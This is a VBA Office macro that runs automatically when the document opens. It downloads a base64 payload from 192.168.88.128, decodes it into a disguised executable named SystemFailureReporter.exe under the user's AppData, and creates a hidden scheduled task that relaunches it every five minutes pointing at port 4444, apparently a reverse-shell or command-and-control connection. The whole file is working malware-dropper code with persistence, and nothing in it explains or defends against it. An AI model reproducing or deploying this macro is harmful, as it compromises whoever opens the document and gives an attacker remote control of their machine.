Sub AutoOpen()
    Main
End Sub

Function ReadFile(localFilePath)
    Dim fso, file, fileContent
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    If fso.FileExists(localFilePath) Then

        Set file = fso.OpenTextFile(localFilePath, 1)
        fileContent = file.ReadAll
        file.Close
        
        ReadFile = fileContent
    Else
        ReadFile = ""
    End If
    
    Set file = Nothing
    Set fso = Nothing
End Function

Sub Base64ToBinary(base64String, outputFilePath)

    Dim xmlDoc, xmlNode
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    

    Set xmlNode = xmlDoc.createElement("b64")
    xmlNode.DataType = "bin.base64"
    xmlNode.Text = base64String
    

    Dim binaryData
    binaryData = xmlNode.nodeTypedValue
    

    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write binaryData
    stream.SaveToFile outputFilePath, 2
    stream.Close
    
    Set stream = Nothing
    Set xmlDoc = Nothing
    Set xmlNode = Nothing
End Sub

Sub Main()
    Dim url, localFilePath, shell, home, base64, exeFilePath
    url = "http://192.168.88.128:1020/base64.txt"


    Set shell = CreateObject("WScript.Shell")
    home = shell.ExpandEnvironmentStrings("%USERPROFILE%")
    
    localFilePath = home & "\AppData\Local\update.xml"
    
    Download url, localFilePath
    
    base64 = ReadFile(localFilePath)
    
    exeFilePath = home & "\AppData\Local\SystemFailureReporter.exe"
    Base64ToBinary base64, exeFilePath
    CreateUserLevelScheduledTask

End Sub

Sub CreateUserLevelScheduledTask()
    Dim taskName As String
    Dim taskAction As String
    Dim command As String
    Dim shell As Object
    
    taskName = "SystemFailureReporter"
    
    taskAction = """%USERPROFILE%\AppData\Local\SystemFailureReporter.exe"" -c 192.168.88.128:4444"
    
    command = "SchTasks /Create /TN " & taskName & " /TR """ & taskAction & """ /SC MINUTE /MO 5 /F /RL LIMITED"
    
    Set shell = CreateObject("WScript.Shell")
    
    shell.Run command, 0, True
    
    Set shell = Nothing
    
    MsgBox ""
End Sub

Sub Download(remoteUrl, localPath)
    Dim xmlhttp
    Set xmlhttp = CreateObject("MSXML2.XMLHTTP")
    
    xmlhttp.Open "GET", remoteUrl, False
    xmlhttp.Send
    
    If xmlhttp.Status = 200 Then
        Dim stream
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write xmlhttp.responseBody
        stream.SaveToFile localPath, 2
        stream.Close
    End If
    
    Set xmlhttp = Nothing
    Set stream = Nothing
End Sub
